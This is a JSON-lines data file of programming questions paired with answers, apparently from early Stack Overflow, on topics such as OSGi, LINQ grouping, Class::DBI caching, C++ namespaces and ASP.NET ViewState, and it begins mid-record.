answers).\nIn my experience you should not try to convert a monolitic application into an OSGi-based one. This usually leads to a badly and unmanageable mess. Start anew.\nDownload one of the freely available stand-alone oSGi implementations. I found Knopflerfish rather good and stable (I use it in many projects). It also comes with lots of source code. You can find it here: http://www.knopflerfish.org\nAnother good tutorial can be found here. https://pro40.abac.com/deanhiller/cgi-bin/moin.cgi/OsgiTutorial\nPeter Kriens of the OSGi Alliance gave a nice interview: http://www.infoq.com/interviews/osgi-peter-kriens. His homepage and blog (which is always a good read can be found here: http://www.aqute.biz"}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "Owen, I'm using Chrome on XP and I don't see \"Vista Aero\" glass theme on the Chrome window. I see it as solid blue.\nIf it's custom theming of controls and windows title bars you want, that can be accomplished. There's an excellent, free UI toolkit for WinForms that does exactly that: KryptonToolkit"}
{"instruction": "I'm supposed to learn how to use LabVIEW for my new job, and I'm wondering if anybody can recommend some good books or reference/tutorial web sites.\nI'm a senior developer with lots of Java/C#/C++ experience.\nI realize that this question is perhaps more vague than is intended on stack overflow, so how about this? Please answer with one book or web site and a brief description. Then people can vote up their favourites.", "output": "Tutorials in G, also check out the webring."}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "Regarding UPnP: be aware that not all routers support UPnP. And if they do it could be switched off (for security reasons). So your solution might not always work.\nYou should also have a look at NatPMP.\nA simple library for UPnP can be found  at http://miniupnp.free.fr/, though it's in C..."}
{"instruction": "I am looking for a way to create an int\\long representation of an arbitrary alpha-numeric String. Hash codes won't do it, because I can't afford hash collisions i.e. the representation must be unique and repeatable. \nThe numeric representation will be used to perform efficient (hopefully) compares. The creation of the numeric key will take some time, but it only has to happen once, whereas I need to perform vast numbers of comparisons with it - which will hopefully be much faster than comparing the raw Strings.\nAny other idea's on faster String comparison will be most appreciated too...", "output": "As long as it's a hash function, be it String.hashCode(), MD5 or SHA1, collision is unavoidable unless you have a fixed limit on the string's length.  It is mathematically impossible to have one-to-one mapping from an infinite group to a finite group.\nStepping back, is collision avoidance absolutely necessary?"}
{"instruction": "I'm supposed to learn how to use LabVIEW for my new job, and I'm wondering if anybody can recommend some good books or reference/tutorial web sites.\nI'm a senior developer with lots of Java/C#/C++ experience.\nI realize that this question is perhaps more vague than is intended on stack overflow, so how about this? Please answer with one book or web site and a brief description. Then people can vote up their favourites.", "output": "The official NI support page and support forums are hard to beat.\nIt really helps having a guru around for LabVIEW."}
{"instruction": "What actually happens to the file system when you do a Subclipse Share Project on an Eclipse project that was externally checked out from Subversion?  All the .svn folders are already in place.  I get an error when I try to Share Project the right way, and I'd rather not delete and re-checkout the projects from the SVN  Repository browser.", "output": "Dunno exactly what happens within eclipse, I presume it does some funky stuff in the .metadata directory of the workspace.  That said, I would recommend the following to get eclipse to learn about the svn settings of the project:\n\nDelete the project from the workspace (keep \"Delete project contents on disk\" unchecked)\nFile > Import... > General > Existing Projects into Workspace\nBrowse to the folder containing the original project(s) of interest\nImport the projects into your workspace\n\nThis seems to have the side effect of subclipse noticing the subversion settings when importing the \"new\" projects into your workspace."}
{"instruction": "If you've used Oracle, you've probably gotten the helpful message \"ORA-00942: Table or view does not exist\". Is there a legitimate technical reason the message doesn't include the name of the missing object? \nArguments about this being due to security sound like they were crafted by the TSA. If I'm an attacker, I'd know what table I just attempted to exploit, and be able to interpret this unhelpful message easily. If I'm a developer working with a complex join through several layers of application code, it's often very difficult to tell.\nMy guess is that when this error was originally implemented, someone neglected to add the object name, and now, people are afraid it will break compatibility to fix it. (Code doing silly things like parsing the error message will be confused if it changes.)\nIs there a developer-friendly (as opposed to recruiting your DBA) way to determine the name of the missing table?\n\nAlthough I've accepted an answer which is relevant to the topic, it doesn't really answer my question: Why isn't the name part of the error message? If anyone can come up with the real answer, I'll be happy to change my vote.", "output": "If its not a huge statement, then the easiest way is just to check the data dictionary,\nSQL> select * from xx,abc;\nselect * from xx,abc\n                 *\nERROR at line 1:\nORA-00942: table or view does not exist\n\n\nSQL> select owner,table_name from all_tables where table_name in ('XX','ABC');\n\nOWNER                          TABLE_NAME\n------------------------------ ------------------------------\nMWATSON                        XX\n\nSQL>\n\nThis isn't ideal, but short of going and examining trace files, I'm not sure how else to do it."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I'm surprised no one has mentioned Perforce. It's free for 2 people, blazingly fast, and integrates with VS.  Also source server has bindings for it by default.  \nIn addition to source control, it really is worthwhile to complete the loop and setup a symbol server and a source server, so that you have simple debugging of anything you've shipped (e.g. no more searching for pdbs or source that match the binary).  Both source and symbol server are completely free and supported in VS since 2005."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I would recommend using subversion.  Many have recommended using a seperate box as a server, in case your dev machine dies.  What happens when the SVN server dies?  The answer here is that no matter where you choose to run the server, ensure you always do frequent backups, possibly automated daily to some secondary, preferrebly offsite machine."}
{"instruction": "What's the recommended source control system for a very small team (one developer)?\nPrice does not matter. Customer would pay :-)\nI'm working on Vista32 with VS 2008 in C++ and later in C# and with WPF. Setting up an extra (physical) server for this seems overkill to me. Any opinions?", "output": "I use Perforce as well for my own personal stuff, mainly because we use it at work. There are emacs bindings for it as well, so you can sync, check stuff in or out, etc. all from within emacs."}
{"instruction": "And/or: do I need one?\nI've recently started using FogBugz for my hobby projects, and I'm very happy with things so far. Having read more about it, especially the evidence-based scheduling, I'd like to start using it for my PhD as well. (Heh; something tells me my supervisors won't be opening tickets for me, though.)\nLast night I stumbled onto TimePost, which looks like a tidy app that doesn't do much but could be a real bonus to logging my time in FogBugz effectively. I tried looking around for similar apps but came up a little empty-handed. Are there any other FogBugz clients that you've used and recommend for Mac OS X? Or are you happy with the web interface?", "output": "I don't think there is any other such Mac tool. I've never found the web interface too bad personally."}
{"instruction": "And/or: do I need one?\nI've recently started using FogBugz for my hobby projects, and I'm very happy with things so far. Having read more about it, especially the evidence-based scheduling, I'd like to start using it for my PhD as well. (Heh; something tells me my supervisors won't be opening tickets for me, though.)\nLast night I stumbled onto TimePost, which looks like a tidy app that doesn't do much but could be a real bonus to logging my time in FogBugz effectively. I tried looking around for similar apps but came up a little empty-handed. Are there any other FogBugz clients that you've used and recommend for Mac OS X? Or are you happy with the web interface?", "output": "I don't know of any native tool, but like Matt I am pretty happy with the web interface."}
{"instruction": "I have a list of Foo. Foo has properties Bar and Lum. Some Foos have identical values for Bar. How can I use lambda/linq to group my Foos by Bar so I can iterate over each grouping's Lums?", "output": "Deeno,\nEnjoy:\nvar foos = new List<Foo> {\n   new Foo{Bar = 1,Lum = 1},\n   new Foo{Bar = 1,Lum = 2},\n   new Foo{Bar = 2,Lum = 3},\n};\n\n// Using language integrated queries:\n\nvar q = from foo in foos\n        group foo by foo.Bar into groupedFoos\n        let lums = from fooGroup in groupedFoos\n                   select fooGroup.Lum\n        select new { Bar = groupedFoos.Key, Lums = lums };\n\n// Using lambdas\n\nvar q = foos.GroupBy(x => x.Bar).\n            Select(y => new {Bar = y.Key, Lums = y.Select(z => z.Lum)});\n\n\nforeach (var group in q)\n{\n    Console.WriteLine(\"Lums for Bar#\" + group.Bar);\n    foreach (var lum in group.Lums)\n    {\n        Console.WriteLine(lum);\n    }\n}\n\nTo learn more about LINQ read 101 LINQ Samples"}
{"instruction": "I like how SQLite library can be included into an application and the application has a full-fledged database to use.\nSimilarly, is there an open source versioning library that I can include into my application so that I can save versions of files as well as do diffs and merges?", "output": "In my opinion Firebird is one of the best choices for embedded DB scenarios.\nAlso Microsoft SQL Server Compact (closed source, but free) might be suitable, however it less capable than Firebird.\nEDIT:\nI misread you question. If you don't need RDBMS, you can try to embed SVN to your application."}
{"instruction": "I like how SQLite library can be included into an application and the application has a full-fledged database to use.\nSimilarly, is there an open source versioning library that I can include into my application so that I can save versions of files as well as do diffs and merges?", "output": "I am not entirely sure what you mean by \"included in an application\", as you could potentially deliver any library so long as the licensing allows.  Are you referring to the fact that sqlite is small or that it is public domain?\nMercurial is a similarly lightweight piece of revision control software.  If you are writing your application in python, which is likely since python now includes sqlite3, importing features directly from mercurial's source code should not be too difficult.  Otherwise there's no shame in invoking commandline processes, though this may be clunkier.  Mercurial is not public domain, but it is GPL'd.\nMercurial is also my personal favorite among modern revision control systems.  It's leaps ahead of CVS and Subversion, and very similar to GIT although somewhat simpler to use."}
{"instruction": "I like how SQLite library can be included into an application and the application has a full-fledged database to use.\nSimilarly, is there an open source versioning library that I can include into my application so that I can save versions of files as well as do diffs and merges?", "output": "SVN doesn't require any prerequisites on end user machine. You can embed SVN right into you app. To learn more on subversion integration, visit \"Application Integration/Embedding\" thread on SVN forum."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "@dicroce : \"There IS a penalty associated with unnecessary verbosity\" - what kind of a penalty? Certainly not a performance penalty.. Maybe the source file will take a larger amount of space on the hard drive? Or whaaat?"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "I use it only when required, except for symmetric operations which due to single argument polymorphism have to be put into methods of one side:\nboolean sameValue (SomeNum other) {\n   return this.importantValue == other.importantValue;\n}"}
{"instruction": "With the code, forms and data inside the same database I am wondering what are the best practices to design a suite of tests for a Microsoft Access application (say for Access 2007).\nOne of the main issues with testing forms is that only a few controls have a hwnd handle and other controls only get one they have focus, which makes automation quite opaque since you cant get a list of controls on a form to act on.\nAny experience to share?", "output": "I would design the application to have as much work as possible done in queries and in vba subroutines so that your testing could be made up of populating test databases, running sets of the production queries and vba against those databases and then looking at the output and comparing to make sure the output is good.  This approach doesn't test the GUI obviously, so you could augment the testing with a series of test scripts (here I mean like a word document that says open form 1, and click control 1) that are manually executed.\nIt depends on the scope of the project as the level of automation necessary for the testing aspect."}
{"instruction": "With the code, forms and data inside the same database I am wondering what are the best practices to design a suite of tests for a Microsoft Access application (say for Access 2007).\nOne of the main issues with testing forms is that only a few controls have a hwnd handle and other controls only get one they have focus, which makes automation quite opaque since you cant get a list of controls on a form to act on.\nAny experience to share?", "output": "I have not tried this, but you could attempt to publish your access forms as data access web pages to something like sharepoint or just as web pages and then use an tool such as selenium to drive the browser with a suite of tests.\nObviously this is not as ideal as driving the code directly through unit tests, but it may get you part of the way. good luck"}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "I am not a Ruby programmer but I have been pretty tightly involved in a JRuby deployment lately and can thus draw some conclusions. Do not expect to much from JRuby's performance. In interpreted mode, it seems to be somewhere in the range of C Ruby. JIT mode might be faster, but only in theory. In practice, we tried JIT mode on Glassfish for a decently-sized Rails application on a medium-sized server (dual core, 8GB RAM). And the truth is, the JITting took so freakingly much time, that the server needed 20-30 minutes before it answered the first request. Memory usage was astronomic, profiling did not work because the whole system grinded to halt with a profiler attached.\nBottom line: JRuby has its merits (multithreading, solid platform, easy Java integration), but given that interpreted mode is the only mode that worked for us in practice, it may be expected to be no better performance-wise than C Ruby."}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "Selenium Grid can run your web tests across multiple machines in parallel, which can speed up the web testing process"}
{"instruction": "I'm pretty keen to develop my first Ruby app, as my company has finally blessed its use internally.\nIn everything I've read about Ruby up to v1.8, there is never anything positive said about performance, but I've found nothing about version 1.9. The last figures I saw about 1.8 had it drastically slower than just about everything out there, so I'm hoping this was addressed in 1.9.\nHas performance drastically improved? Are there some concrete things that can be done with Ruby apps (or things to avoid) to keep performance at the best possible level?", "output": "I'd second the recommendation of the use of Passenger - it makes deployment and management of Rails applications trivial"}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "I mostly use CubicTest, which is an eclipse plugin that lets you define tests graphically. It can export/run tests through several libraries, including watir and selenium. Most people just use the Selenium runner though.\nFull disclosure: I'm one of the developers, so I'm kind of biased :)\nTake a closer look here: cubictest.openqa.org\n-Erlend"}
{"instruction": "I'm currently working on a large implementation of Class::DBI for an existing database structure, and am running into a problem with clearing the cache from Class::DBI.  This is a mod_perl implementation, so an instance of a class can be quite old between times that it is accessed.\nFrom the man pages I found two options:\nMusic::DBI->clear_object_index();\n\nAnd:\nMusic::Artist->purge_object_index_every(2000);\n\nNow, when I add clear_object_index() to the DESTROY method, it seems to run, but doesn't actually empty the cache.  I am able to manually change the database, re-run the request, and it is still the old version.\npurge_object_index_every says that it clears the index every n requests.  Setting this to \"1\" or \"0\", seems to clear the index... sometimes.  I'd expect one of those two to work, but for some reason it doesn't do it every time.  More like 1 in 5 times.\nAny suggestions for clearing this out?", "output": "I've used remove_from_object_index successfully in the past, so that when a page is called that modifies the database, it always explicitly reset that object in the cache as part of the confirmation page."}
{"instruction": "I need to do a quick demo app using Google Maps (or Yahoo Maps, or any similar service).  So far I haven't had much luck finding .NET wrappers for any of these services.\nAny suggestions or pointers?\nI'm not opposed to using the native javascript api to do this, but I assumed someone would have already written a wrapper to easily integrate this into an ASP.NET application.", "output": "I like the virtual earth maps that microsoft produces. For a .net mashup of this go here:\nhttp://dotnetslackers.com/columns/ajax/ASPNETAJAXMeetsVirtualEarthPartOne.aspx"}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "If you are using a 3rd party payment gateway, you don't need to store the numbers.\nThere is no point."}
{"instruction": "I'm currently working on a large implementation of Class::DBI for an existing database structure, and am running into a problem with clearing the cache from Class::DBI.  This is a mod_perl implementation, so an instance of a class can be quite old between times that it is accessed.\nFrom the man pages I found two options:\nMusic::DBI->clear_object_index();\n\nAnd:\nMusic::Artist->purge_object_index_every(2000);\n\nNow, when I add clear_object_index() to the DESTROY method, it seems to run, but doesn't actually empty the cache.  I am able to manually change the database, re-run the request, and it is still the old version.\npurge_object_index_every says that it clears the index every n requests.  Setting this to \"1\" or \"0\", seems to clear the index... sometimes.  I'd expect one of those two to work, but for some reason it doesn't do it every time.  More like 1 in 5 times.\nAny suggestions for clearing this out?", "output": "$obj->dbi_commit(); may be what you are looking for if you have uncompleted transactions. However, this is not very likely the case, as it tends to complete any lingering transactions automatically on destruction.\nWhen you do this:\nMusic::Artist->purge_object_index_every(2000);\n\nYou are telling it to examine the object cache every 2000 object loads and remove any dead references to conserve memory use. I don't think that is what you want at all.\nFurthermore,\nMusic::DBI->clear_object_index();\n\nRemoves all objects form the live object index. I don't know how this would help at all; it's not flushing them to disk, really.\nIt sounds like what you are trying to do should work just fine the way you have it, but there may be a problem with your SQL or elsewhere that is preventing the INSERT or UPDATE from working. Are you doing error checking for each database query as the perldoc suggests? Perhaps you can begin there or in your database error logs, watching the queries to see why they aren't being completed or if they ever arrive.\nHope this helps!"}
{"instruction": "I need to do a quick demo app using Google Maps (or Yahoo Maps, or any similar service).  So far I haven't had much luck finding .NET wrappers for any of these services.\nAny suggestions or pointers?\nI'm not opposed to using the native javascript api to do this, but I assumed someone would have already written a wrapper to easily integrate this into an ASP.NET application.", "output": "Here are some links but as with most things i have not got round to trying them yet.\nhttp://gathadams.com/2007/08/21/add-google-maps-to-your-net-site-in-10-minutes/\nhttp://www.mapbuilder.net/\nCheers John"}
{"instruction": "How do I detect if the system has a default recording device installed?\nI bet this can be done through some calls to the Win32 API, anyone has any experience with this?\nI'm talking about doing this through code, not by opening the control panel and taking a look under sound options.", "output": "The win32 api has a function called waveInGetNumDevs for it."}
{"instruction": "As part of our product release we ship Apache HTTP Server binaries that we have compiled on our (UNIX) development machine.\nWe tell our clients to install the binaries (on their UNIX servers) under the same directory structure that we compiled it under. For some clients this is not appropriate, e.g. where there are restrictions on where they can install software on their servers and they don't want to compile Apache themselves.\nIs there a way of compiling Apache HTTP Server so its installation location(s) can be specified dynamically using environment variables ?\nI spent a few days trying to sort this out and couldn't find a way to do it. It led me to believe that the Apache binaries were hard coding some directory paths at compilation preventing the portability we require.\nHas anyone managed to do this ?", "output": "@Hissohathair\nI suggest 1 change to @Hissohathair's answer.\n6). ./bin/httpd -d <server path> (although it can be overridden in the config file)\n\nIn apacheclt there is a variable for HTTPD where you could override to use it."}
{"instruction": "I have an inherited project that uses a build script (not make) to build and link the project with various libraries.\nWhen it performs a build I would like to parse the build output to determine what and where the actual static libraries being linked into the final executable are and where are they coming from.\nThe script is compiling and linking with GNU tools.", "output": "Static libraries, that makes life more difficult in this regard. In case of dynamic libraries you could just have used ldd on the resulting executable and be done with it. The best bet would be some kind of configuration file. Alternatively you could try to look for -l arguments to gcc/ld. Those are used to specify libraries. You could write a script for extracting it from the output, though I suspect that you will have to do it manually because by the time you know what the script should look for you probably already know the answer."}
{"instruction": "I have an inherited project that uses a build script (not make) to build and link the project with various libraries.\nWhen it performs a build I would like to parse the build output to determine what and where the actual static libraries being linked into the final executable are and where are they coming from.\nThe script is compiling and linking with GNU tools.", "output": "It is probably possible to do something useful using e.g. Perl, but you would have to provide more details.  On the other hand, it could be easier to simply analyze the script..."}
{"instruction": "I have an inherited project that uses a build script (not make) to build and link the project with various libraries.\nWhen it performs a build I would like to parse the build output to determine what and where the actual static libraries being linked into the final executable are and where are they coming from.\nThe script is compiling and linking with GNU tools.", "output": "You might try using the nm tool.  Given the right options, it will look at a binary (archive or linked image) and tell you what objects were linked into it.\nActually, here's a one-liner I use at work:\n#!/bin/sh\n\nnm -Ag $* | sed 's/^.*\\/\\(.*\\.a\\):/\\1/' | sort -k 3 | grep -v ' U '\n\nto find the culprits for undefined symbols.  Just chop off the last grep expression and it should pretty much give you what you want."}
{"instruction": "I'm using the d programing language to write a program, and I'm trying to use ddbg to debug it.  When there is an exception, I want to have the program break whenever there is an exception thrown so that I can inspect the stack.\nAlternatively, is there another debugger that works with d?  Is there another way to get a stack trace when there is an exception?", "output": "Haven't used ddbg yet, but according to the documentation at http://ddbg.mainia.de/doc.html there is the\n\nonex <cmd; cmd; ...>               on exception execute list of commands\n\ncommand."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "I can perhaps give you a taste of our experience when we began looking at unit testing our middle-tier process that included a ton of \"business logic\" sql operations.\nWe first created an abstraction layer that allowed us to \"slot in\" any reasonable database connection (in our case, we simply supported a single ODBC-type connection).\nOnce this was in place, we were then able to do something like this in our code (we work in C++, but I'm sure you get the idea):\nGetDatabase().ExecuteSQL( \"INSERT INTO foo ( blah, blah )\" )\nAt normal run time, GetDatabase() would return an object that fed all our sql (including queries), via ODBC directly to the database.\nWe then started looking at in-memory databases - the best by a long way seems to be SQLite. (http://www.sqlite.org/index.html).  It's remarkably simple to set up and use, and allowed us subclass and override GetDatabase() to forward sql to an in-memory database that was created and destroyed for every test performed.\nWe're still in the early stages of this, but it's looking good so far, however we do have to make sure we create any tables that are required and populate them with test data - however we've reduced the workload somewhat here by creating a generic set of helper functions that can do a lot of all this for us.\nOverall, it has helped immensely with our TDD process, since making what seems like quite innocuous changes to fix certain bugs can have quite strange affects on other (difficult to detect) areas of your system - due to the very nature of sql/databases.\nObviously, our experiences have centred around a C++ development environment, however I'm sure you could perhaps get something similar working under PHP/Python.\nHope this helps."}
{"instruction": "What are the best code snippets for C#? (using visual studio)  VB has a lot that are pre-defined, but there are only a handful for C#.  Do you have any really useful ones for C#?\nAnyone want to post a good custom one you created yourself?\nAnyone?... Bueller?", "output": "prop and exception are my favorites."}
{"instruction": "What are the best code snippets for C#? (using visual studio)  VB has a lot that are pre-defined, but there are only a handful for C#.  Do you have any really useful ones for C#?\nAnyone want to post a good custom one you created yourself?\nAnyone?... Bueller?", "output": "There's plenty of code snippets within Visual Studio for basic programming structure but I wouldn't necessarily rate one higher than another. \nI would definitely say the best ones are the custom snippets you define yourself to accomplish more specific tasks that you may find yourself using on a regular basis. Definitely a big time saver. \nA fairly basic intro to creating custom snippets can be found at http://www.15seconds.com/issue/080724.htm to help with this."}
{"instruction": "I'm using the d programing language to write a program, and I'm trying to use ddbg to debug it.  When there is an exception, I want to have the program break whenever there is an exception thrown so that I can inspect the stack.\nAlternatively, is there another debugger that works with d?  Is there another way to get a stack trace when there is an exception?", "output": "I saw the onex command, but I couldn't find a break command.  The two commands below don't seem to work.\nonex break\nonex b"}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Bigger C++ projects I've seen hardly used more than one namespace (e.g. boost library).\n\nActually boost uses tons of namespaces, typically every part of boost has its own namespace for the inner workings and then may put only the public interface in the top-level namespace boost.\nPersonally I think that the larger a code-base becomes, the more important namespaces become, even within a single application (or library). At work we put each module of our application in its own namespace.\nAnother use (no pun intended) of namespaces that I use a lot is the anonymous namespace:\nnamespace {\n  const int CONSTANT = 42;\n}\n\nThis is basically the same as:\nstatic const int CONSTANT = 42;\n\nUsing an anonymous namespace (instead of static) is however the recommended way for code and data to be visible only within the current compilation unit in C++."}
{"instruction": "I'm really beginning to understand what people mean when they say that C++'s error messages are pretty terrible in regards to templates.  I've seen horrendously long errors for things as simple as a function not matching its prototype.\nAre there any tricks to deciphering these errors?\nEDIT:  I'm using both gcc and MSVC.  They both seem to be pretty terrible.", "output": "You can try the following tool to make things more sane:\nhttp://www.bdsoft.com/tools/stlfilt.html"}
{"instruction": "I'm really beginning to understand what people mean when they say that C++'s error messages are pretty terrible in regards to templates.  I've seen horrendously long errors for things as simple as a function not matching its prototype.\nAre there any tricks to deciphering these errors?\nEDIT:  I'm using both gcc and MSVC.  They both seem to be pretty terrible.", "output": "Some compilers give better messages than others. What compiler are you using? Having said that, they are all pretty bad. C++0X will fix most of this problem (see concepts), but the standard won't be released until 2009, and broad support will probably be even later than that :-("}
{"instruction": "I come from a Java background, where packages are used, not namespaces. I'm used to putting classes that work together to form a complete object into packages, and then reusing them later from that package. But now I'm working in C++.\nHow do you use namespaces in C++? Do you create a single namespace for the entire application, or do you create namespaces for the major components? If so, how do you create objects from classes in other namespaces?", "output": "Don't listen to every people telling you that namespaces are just name-spaces.\nThey are important because they are considered by the compiler to apply the interface principle. Basically, it can be explained by an example:\nnamespace ns {\n\nclass A\n{\n};\n\nvoid print(A a)\n{\n}\n\n}\n\nIf you wanted to print an A object, the code would be this one:\nns::A a;\nprint(a);\n\nNote that we didn't explicitly mention the namespace when calling the function. This is the interface principle: C++ consider a function taking a type as an argument as being part of the interface for that type, so no need to specify the namespace because the parameter already implied the namespace.\nNow why this principle is important? Imagine that the class A author did not provide a print() function for this class. You will have to provide one yourself. As you are a good programmer, you will define this function in your own namespace, or maybe in the global namespace.\nnamespace ns {\n\nclass A\n{\n};\n\n}\n\nvoid print(A a)\n{\n}\n\nAnd your code can start calling the print(a) function wherever you want. Now imagine that years later, the author decides to provide a print() function, better than yours because he knows the internals of his class and can make a better version than yours.\nThen C++ authors decided that his version of the print() function should be used instead of the one provided in another namespace, to respect the interface principle. And that this \"upgrade\" of the print() function should be as easy as possible, which means that you won't have to change every call to the print() function. That's why \"interface functions\" (function in the same namespace as a class) can be called without specifying the namespace in C++.\nAnd that's why you should consider a C++ namespace as an \"interface\" when you use one and keep in mind the interface principle.\nIf you want better explanation of this behavior, you can refer to the book Exceptional C++ from Herb Sutter"}
{"instruction": "http://stackoverflow.com/questions/12073/what-is-the-best-xml-editor was a great question regarding XML editors on Windows. What about on OS X?\nOxygen is feature complete, but, it's a Java app and a  bit clunky on OSX. It's also extremely expensive.\nAnything Mac native and comparable in features for less than $300 ?\nThanks\nAndrew", "output": "The latest JEdit Builds on the 4.3 branch combined with a wealth of plugins give you a lot of advanced XML/SLT/XQuery functionality.  \nThe downsides are it's still a Java Application, with all the lipstick on a pig implications that brings.  You'll also find inconsistent UI Metaphors in the various plugins.  There's a lot of poking and prodding you'll need to do, and last time I checked the JEdit forums there was a lot of \"you idiot, it works like this\" going on. \nThe upsides are free and legitimately powerful.  I'm a BBEdit user, but I keep JEdit around for writing XQuery."}
{"instruction": "I'm really beginning to understand what people mean when they say that C++'s error messages are pretty terrible in regards to templates.  I've seen horrendously long errors for things as simple as a function not matching its prototype.\nAre there any tricks to deciphering these errors?\nEDIT:  I'm using both gcc and MSVC.  They both seem to be pretty terrible.", "output": "I sure as hell can't. Small errors explode into pages and pages of unreadable junk. Usually early in the morning, before coffee. :(\nMy only advice is to take a deep breath, start at the top and try and parse the important pieces of information. (I know, easier said than done, right?)."}
{"instruction": "What are the best code snippets for C#? (using visual studio)  VB has a lot that are pre-defined, but there are only a handful for C#.  Do you have any really useful ones for C#?\nAnyone want to post a good custom one you created yourself?\nAnyone?... Bueller?", "output": "These are the ones I use daily.\n\nprop\ntry\nif\nelse\nfor\nforeach\nmbox - Message box stub\nThe ability to role your own.  I have one for Property that are saved in the view state, methods a custom class example."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "I have tested many ways to remove the load of view state from the page and between all hacks and some software out there the only thing that it is truly scalable is the StrangeLoops As10000 appliance. Transparent, no need to change the underlying application."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "As previously stated, I have used the database to store the ViewState in the past.  Although this works for us, we don't come close to 2 million unique visitors per hour.\nI think a hardware solution is definitely the way to go, whether using the StrangeLoop products or another product."}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "Due to the typical organizational bloat, requesting new hardware takes eons, and requesting hardware that would involve a complete rewire of our current setup would probably get some severe resistance from the engineering department.\nI really need to come up with a software solution, because that's the only world I have some control over.\nYay for Enterprise :("}
{"instruction": "We are trying to lighten our page load as much as possible. Since ViewState can sometimes swell up to 100k of the page, I'd love to completely eliminate it.\nI'd love to hear some techniques other people have used to move ViewState to a custom provider.\nThat said, a few caveats:\n\nWe serve on average 2 Million unique visitors per hour.\nBecause of this, Database reads have been a serious issue in performance, so I don't want to store ViewState in the database.\nWe also are behind a load balancer, so any solution has to work with the user bouncing from machine to machine per postback.\n\nIdeas?", "output": "I've tried to find some of the products I had researched in the past that works just like StrangeLoops (but software based) It looks like they went all out of business, the only thing from my list that still up there is ScaleOut but they are specialized in session state caching. \nI understand how hard it is to sell hardware solutions to senior management but it is always a good idea to at least get management to accept listening to the hardware's sales rep. I am much rather putting some hardware that will present me with an immediate solution because it allows me (or buy me some time) to get some other real job done. \nI understand, it really sucks but the alternative is to change your code for optimization and that would maybe cost a lot more than getting an appliance.\nLet me know if you find another software based solution."}
